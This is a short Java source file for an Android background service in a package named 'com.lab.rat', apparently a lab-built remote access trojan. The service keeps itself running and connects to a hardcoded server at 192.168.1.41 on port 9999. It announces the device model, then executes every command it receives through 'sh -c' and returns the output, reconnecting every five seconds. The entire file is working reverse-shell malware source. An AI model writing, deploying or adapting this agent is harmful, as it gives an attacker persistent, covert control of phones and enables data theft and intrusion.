package com.lab.rat;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.*;
import java.net.Socket;
public class Agent extends Service {
    String SERVER = "192.168.1.41"; 
    int PORT = 9999;
    @Override
    public int onStartCommand(Intent i, int f, int s) {
        new Thread(new Runnable() { public void run() { loop(); } }).start();
        return START_STICKY;
    }
    void loop() {
        while (true) {
            try {
                Socket sock = new Socket(SERVER, PORT);
                BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                PrintWriter out = new PrintWriter(sock.getOutputStream(), true);
                out.println("agent up: " + android.os.Build.MODEL);
                String cmd;
                while ((cmd = in.readLine()) != null) {
                    out.println("$ " + cmd);
                    out.println(run(cmd));
                }
                sock.close();
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (Exception x) {}
            }
        }
    }
    String run(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = r.readLine()) != null) sb.append(l).append("\n");
            p.waitFor();
            return sb.toString();
        } catch (Exception e) { return "err: " + e.getMessage(); }
    }
    @Override
    public IBinder onBind(Intent i) { return null; }
}
